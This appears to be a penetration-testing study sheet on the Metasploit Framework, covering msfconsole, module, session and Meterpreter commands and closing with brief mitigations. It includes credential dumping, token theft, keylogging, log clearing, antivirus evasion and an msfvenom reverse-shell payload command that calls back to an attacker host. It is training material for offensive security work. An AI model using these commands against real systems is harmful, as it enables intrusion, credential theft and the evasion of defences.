# Using the Metasploit Framework
## 🎯 Main Idea
- Learn to use the Metasploit Framework (MSF) as an all-in-one exploitation platform that organizes reconnaissance, exploitation, payload delivery, and post-exploitation.
- Understand MSF structure (modules, exploits, payloads, encoders, targets, databases, plugins, sessions) and how to drive it from `msfconsole`.
- Deliver and manage shells with Meterpreter, generate standalone payloads with MSFVenom, and evade defenses (encoders, AV/IDS/IPS).

## 💥 Attack / Exploit Vectors
### MSFconsole (the interface)
- Primary CLI to search, configure, and launch modules against targets.
- **Commands**
  - `search <name>` — Search for exploits or modules within the Framework.
  - `use <name>` / `use <number>` — Load an exploit or module (e.g. `use windows/smb/psexec`).
  - `info` — Load information about a specific exploit or module.
  - `show options` — Show the options available for a module or exploit.
  - `show targets` — Show the platforms supported by the exploit.
  - `check` — Determine whether a target is vulnerable to an attack.
  - `exploit` — Execute the module/exploit and attack the target.
  - `exploit -j` — Run the exploit in the background as a job.
  - `exploit -z` — Do not interact with the session after exploitation.

### Modules (exploit / auxiliary / post)
- Reusable components; exploits deliver payloads, auxiliary modules scan/enumerate/fuzz, post modules run after access.
- **Commands**
  - `show exploits` — Show all exploits within the Framework.
  - `show auxiliary` — Show all auxiliary modules within the Framework.
  - `show advanced` — Show advanced options.

### Targets
- Select the specific OS / service-pack build the exploit should match.
- **Commands**
  - `show targets` — List platforms supported by the exploit.
  - `set target <number>` — Specify a target index when the OS/service pack is known.

### Payloads
- Code executed on the target after exploitation (reverse/bind shells, Meterpreter); set LHOST/RHOST for callbacks.
- **Commands**
  - `show payloads` — Show all payloads.
  - `set payload <payload>` / `set payload <number>` — Specify the payload to use.
  - `set LHOST` / `set RHOST` — Local (attacker, reverse-shell callback) and remote (target) IPs.
  - `setg <function>` — Set a value globally across modules.
  - `set autorunscript migrate -f` — Auto-migrate to a separate process after exploitation.

### Encoders
- Re-encode payloads to evade signature detection / remove bad characters.
- **Commands**
  - `exploit -e <encoder>` — Specify the payload encoder (e.g. `shikata_ga_nai`).

### Databases (db-driven attacks)
- Store hosts, services, and loot; integrate Nmap results for workspace-wide tracking.
- **Commands**
  - `db_create <name>` / `db_connect <name>` — Create / connect to a database.
  - `db_nmap` — Run Nmap and store results in the database.
  - `db_destroy` / `db_destroy <user:password@host:port/database>` — Delete the current database.

### Sessions
- Manage multiple shells from successful exploitation; upgrade/background/interact.
- **Commands**
  - `sessions -l` / `sessions -l -v` — List available sessions (verbose shows the vuln used).
  - `sessions -s <script>` — Run a Meterpreter script on all live sessions.
  - `sessions -c <cmd>` — Execute a command on all live Meterpreter sessions.
  - `sessions -u <sessionID>` — Upgrade a Win32 shell to Meterpreter.
  - `sessions -K` — Kill all live sessions.

### Meterpreter (post-exploitation payload)
- Advanced in-memory payload for enumeration, privilege escalation, token theft, credential dumping, pivoting, and anti-forensics.
- **Commands**
  - `sysinfo` / `ps` / `ls` — System info, running processes, list files.
  - `migrate <proc id>` — Migrate into another process.
  - `getsystem` — Attempt SYSTEM-level privilege escalation.
  - `getprivs` — Enable as many privileges as possible.
  - `hashdump` — Dump all password hashes on the target.
  - `use incognito` + `list_tokens -u/-g` + `impersonate_token <DOMAIN\\USER>` — Token stealing / impersonation.
  - `steal_token <proc id>` / `drop_token` / `rev2self` — Steal / drop token, revert to original user.
  - `shell` / `execute -f cmd.exe -i -H -t` — Drop to a shell / run a hidden process with all tokens.
  - `upload <file>` / `download <file>` — Transfer files to/from target.
  - `screenshot` — Capture the target's screen.
  - `keyscan_start` / `keyscan_dump` / `keyscan_stop` — Keylogging.
  - `reg <command>` — Interact with the target registry.
  - `background` — Background the current Meterpreter session.
  - `clearev` / `timestomp` — Anti-forensics: clear event logs / alter file timestamps.
  - `add_user` / `add_group_user "Domain Admins" <user> -h <ip>` — Create users / add to Domain Admins.

### MSFVenom (standalone payload generation)
- Generate payloads outside an exploit (exe, elf, scripts, web shells) for manual delivery.
- **Commands**
  - `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<ip> LPORT=<port> -f exe -o payload.exe` — Build a standalone payload (combine with `exploit/multi/handler`).

### Firewall & IDS/IPS Evasion
- Combine encoders, payload format/architecture choices, and HTTPS payloads to bypass perimeter defenses.

### Writing & Importing Modules
- Import community/custom Ruby modules into MSF to extend its exploit database.

### Plugins
- Load external integrations/automation into msfconsole to extend functionality.

## 🛠️ Key Tools & Concepts
- msfconsole — Main interactive MSF interface.
- MSFVenom — Standalone payload/shellcode generator.
- Meterpreter — In-memory post-exploitation payload with extensions (priv, incognito, sniffer).
- Exploit vs Auxiliary vs Post modules — Attack / support (scan, fuzz) / after-access modules.
- Reverse vs Bind payloads — Callback to attacker (LHOST) vs listener on target (RHOST).
- Encoders (shikata_ga_nai) — Signature evasion and bad-char removal.
- multi/handler — Listener for catching standalone MSFVenom payload callbacks.
- Database workspace + db_nmap — Persistent tracking of hosts/services/loot.
- Sniffer / keyscan / incognito — Traffic sniffing, keylogging, token impersonation extensions.

## 🛡️ Mitigations
- Patch management to remove the vulnerabilities MSF exploits target.
- Endpoint detection/AV and IDS/IPS tuned to catch common payloads/encoders despite evasion.
- Restrict and monitor privileged tokens to limit incognito/getsystem impersonation.
- Monitor for event-log clearing and timestamp tampering (anti-forensics indicators).
